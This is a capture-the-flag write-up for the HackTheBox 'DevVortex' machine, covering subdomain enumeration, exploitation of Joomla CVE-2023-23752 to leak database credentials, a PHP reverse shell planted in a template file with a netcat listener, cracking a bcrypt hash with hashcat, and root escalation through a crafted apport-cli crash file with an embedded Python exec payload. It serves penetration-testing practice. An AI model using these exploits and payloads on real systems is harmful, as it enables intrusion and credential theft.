---
title: "DevVortex"
description: "Easy HackTheBox seasonal machine."
author: "hackthebox"
date: "2024-02-08"
published: true
tags: ["capture the flag", "hackthebox", "web", "networks"]
---

# devvortex

<aside>
I feel like I use tools like LinPEAS too often, and in ways that aren't particularly helpful. This box was rated easy, and so I wanted to try privesc without relying it; unfortunately I think <code>user </code> -> <code>root</code> was probably a little <b>too</b> easy.
</aside>

Running `rustscan` to enumerate for open ports, we’re given an `nginx` service on port 80 and an `ssh` service on port 22.

```
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can’t access `ssh` without credentials, and there is nothing to find of particular interest on the webpage itself; I did some enumeration with `feroxbuster` and re-ran port scans with various options, but its just static HTML. Looking at some `nginx` vulnerabilities for `v1.18.0` was also a pretty big waste of time.

I wasn’t *particularly* keen on having to enumerate for domain stuff - I’ll have to do more work to learn a tool or write code, but HTB often makes use of virtual hosts/subdomains, which we can enumerate for via the `Host` header of a HTTP GET request.

I wrote the following Python script, but it would be handy to have a simple single-purpose tool for this, so I want to rewrite this in Rust at some point.

```python
#!/usr/bin/env python

import os
import requests

IP = "10.10.11.242"
host_list: list[str] = (open("/home/please/git/red_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt").read().strip().split("\\n"))

for host in host_list:
    headers: dict[str, str] = {"Host": f"{host}.devvortex.htb"}
    try:
        res = requests.get(f"http://{IP}/", headers=headers)
        if res.status_code == 200:
            print(f"{host}.devvortex.htb seems up")

    # continue to run script if we are redirected back to the root page
    except requests.exceptions.TooManyRedirects as err:
        print(f"exception ({err}): on virthost {host}.devvortex.htb")
        continue

    # ignore this error, which is due to my internet dropping out
    except requests.exceptions.ConnectionError as err:
        print(f"exception ({err}): on virthost {host}.devvortex.htb")
        continue

```

The script only makes it like 10 requests in, but it registers a response with a 200 status from the subdomain `dev.devvortex.htb`.

```
[...]

exception (Exceeded 30 redirects.): on virthost m.devvortex.htb
exception (Exceeded 30 redirects.): on virthost blog.devvortex.htb
dev.devvortex.htb seems up
exception (Exceeded 30 redirects.): on virthost www2.devvortex.htb

[...]
```

Once again, there’s nothing to be seen on the landing page, but we get some interesting results when we run `feroxbuster` on this subdomain:

```
$ feroxbuster --url <http://dev.devvortex.htb/> --smart -t 20 -w ~/git/red_tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o ferox-dev_subd.log --redirects -C 404

200      GET        1l        2w       31c <http://dev.devvortex.htb/modules/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/images/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/cache/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/language/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/components/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/plugins/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/tmp/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/templates/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/includes/>

[...]
```

Our scan turns up an `/administrator/` endpoint, which holds a Joomla! CMS login:

![Untitled](/img/devvortex_img/Untitled.png)

We can run `droopescan`, which informs us that the server is running version `4.2.6` of Joomla at the `/administrator/manifests/files/joomla.xml` endpoint.

```bash
$ ./droopescan scan joomla --url <http://dev.devvortex.htb>                                                                                                                                                       ✭
[+] No version found.

[+] Possible interesting urls found:
    Detailed version information. - <http://dev.devvortex.htb/administrator/manifests/files/joomla.xml>
    Login page. - <http://dev.devvortex.htb/administrator/>
    License file. - <http://dev.devvortex.htb/LICENSE.txt>
    Version attribute contains approx version - <http://dev.devvortex.htb/plugins/system/cache/cache.xml>

[+] Scan finished (0:00:00.860053 elapsed)
```

This version is vulnerable to `CVE-2023-23752`, which is an unauthenticated information disclosure vulnerability. We can exploit this to gain access to the CMS as a superuser with `lewis@devvortex.htb`'s credentials:

```
$ ruby exploit.rb <http://dev.devvortex.htb>
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

> Also making a mental note of the `mysqli` DB.
>

At this point, I kept getting the following error, alongside repeated invalidation of my session cookie and being kicked out of the CMS.

![Untitled](/img/devvortex_img/Untitled%201.png)

I thought this was part of the box (it wasn’t) so I got stuck here for a *very* long time - this issue was persistent through box resets - but swapping to another HTB server fixed this issue.

Similar to other CMS backends, like `Wordpress`, we can write malicious PHP to one of the template files (I used `/templates/cassiopiea/error.php`) and execute that as a PHP program; in this case, we can do the classic PentestMonkey PHP reverse shell script with our local IP and favorite port, start up a netcat listener, and make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to execute the script to get onto the machine via `ssh`.

![Untitled](/img/devvortex_img/Untitled%202.png)

We can also run through some commands to upgrade the dumb shell session to a `tty` - this is more convenience than anything:

- We can use the available `python3` binary to spawn a `pseudo-teletype`/`pty` with the `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")`)
- Then, upgrade the `pty` to a fully interactive `tty` by copying over some of our terminal environment - allowing the `ssh` session to register the keys we send exactly as we send them:

```bash
[please@ruby]:[~] $ nc -lnvp 9999                                                                                                                             130 ↵
Listening on 0.0.0.0 9999
Connection received on 10.129.45.143 39578
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 13:46:45 up 53 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ echo $TERM

$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devvortex:/$ echo $TERM
echo $TERM
dumb
www-data@devvortex:/$ ^Z
[1]  + 219973 suspended  nc -lnvp 9999
[please@ruby]:[~] $ echo $TERM; stty -a                                                                                                                       148 ↵
tmux-256color
speed 38400 baud; rows 74; columns 164; line = 0;
intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
[please@ruby]:[~] $ stty raw -echo;fg
[1]  + 219973 continued  nc -lnvp 9999
                                      reset
reset: unknown terminal type unknown
Terminal type? tmux-256color
www-data@devvortex:/$ export SHELL=zsh
www-data@devvortex:/$ export TERM=tmux-256color
www-data@devvortex:/$ stty rows 74 columns 164
```

Now `cat`’ing out `/etc/passwd`, we see that there are two users with login shells - `root` and `logan`.

```bash
www-data@devvortex:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

`cd`ing to `/home/logan`, the `user.txt` within is not readable to us, so instead we should check out the `mysqli` service using the credentials scraped from the Joomla vulnerability.

```bash
www-data@devvortex:/home/logan$ ls -la
total 28
drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 .
drwxr-xr-x 3 root  root  4096 Sep 26 19:16 ..
lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
-rw-r--r-- 1 logan logan  220 Sep 26 19:16 .bash_logout
-rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrc
drwx------ 2 logan logan 4096 Oct 26 15:12 .cache
-rw-r--r-- 1 logan logan  807 Sep 26 19:16 .profile
-rw-r----- 1 root  logan   33 Feb  5 12:53 user.txt
```

```sql
www-data@devvortex:/home/logan$ mysql --user=lewis --password=P4ntherg0t1n5r3c0n## --host=localhost
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \\g.
Your MySQL connection id is 62
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;

# ...

| sd4fg_users                   |

# ...

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-02-05 12:54:58 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql>
```

Terminal displays the horrific and illegible print-out of a wide SQL table as always, but the `$2y$10$...` prefix indicates we have some `bcrypt` hashes on our hands (I think they are cost-factor 10 hashes =  `2^10` Iterations. That could be a complete lie. Also kind of irrelevant).

I don’t think we really care about `lewis` anymore, so we’ll grab `logan`'s hash and run it through `hashcat` against `rockyou.txt`:

```bash
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat --help | grep -ie "bcrypt"
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > logan.bcrypt-hash
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat -a 0 -m 3200 logan.bcrypt-hash ~/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

CUDA API (CUDA 12.3)
====================
* Device #1: NVIDIA GeForce RTX 4090, 23126/24195 MB, 128MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 843 MB

Dictionary cache built:
* Filename..: /home/please/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Tue Feb  6 00:08:13 2024 (0 secs)
Time.Estimated...: Tue Feb  6 00:08:13 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/please/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     7254 H/s (6.24ms) @ Accel:1 Loops:16 Thr:24 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344384 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> dangerous
Hardware.Mon.#1..: Temp: 52c Fan:  0% Util: 94% Core:2760MHz Mem:10501MHz Bus:16

Started: Tue Feb  6 00:08:08 2024
Stopped: Tue Feb  6 00:08:15 2024
```

Heading back to the server with plaintext credentials in hand, we can close out of our reverse shell, and login using `logan@<IP>`, using `tequieromucho` as the password:

```bash
[please@ruby]:[~] $ ssh logan@10.129.45.143
The authenticity of host '10.129.45.143 (10.129.45.143)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: 10.10.11.242
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.45.143' (ED25519) to the list of known hosts.
logan@10.129.45.143's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/advantage>

  System information as of Mon 05 Feb 2024 02:09:14 PM UTC

  System load:           0.01
  Usage of /:            63.5% of 4.76GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             172
  Users logged in:       0
  IPv4 address for eth0: 10.129.45.143
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3352

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   <https://ubuntu.com/engage/secure-kubernetes-at-the-edge>

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See <https://ubuntu.com/esm> or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ cat user.txt
a285f0ff772a16a92ae496048f8ec17f
```

We can check `logan`'s `sudoer` entry with `sudo -l`, we know that they’re able to run `apport-cli` as `root`:

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

[This POC](https://github.com/DonnchaC/ubuntu-apport-exploitation) explains that viewing a crafted crash log can allow for code execution. We can’t just use any random file as this must be a *crafted* log, but the POC *does* include a `minimal-rce.crash` file that does the heavy lifting for us.
We can copy/paste its contents into a file on the box and pass it to `apport-cli` that we invoke as `root` with `sudo apport-cli -c ./test.crash`:

```bash
logan@devvortex:~$ vim ./test.crash
logan@devvortex:~$ sudo apport-cli -c ./test.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

```

Choosing option `V` opens the log in the `apport-cli` viewer, which seems to just be Vim or something (this is Ubuntu/GNOME-specific and I don't really know what Apport is - I use Arch btw). We can invoke a `root` shell with `!bash` and then `cat` out the second flag at `/root/root.txt`:

```bash
== CrashDB =================================
{'impl': 'memory', 'crash_config': exec("""
import subprocess
payload_cmd = "pkill -9 apport; gnome-calculator"
subprocess.Popen(payload_cmd, shell=True)
""", {}) }

== ExecutablePath =================================
/usr/bin/file-roller

== ProblemType =================================
Bug

== Stacktrace =================================
None

== UnreportableReason =================================
A package hook defines an invalid crash database definition:
{'impl': 'memory', 'crash_config': exec("""
import subprocess
payload_cmd = "pkill -9 apport; gnome-calculator"
subprocess.Popen(payload_cmd, shell=True)
""", {}) }
!bash
```

```bash
*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

root@devvortex:/home/logan# whoami
root
root@devvortex:/home/logan# cat /root/root.txt
b60647d85778b3db2521377e8ee9038d
```
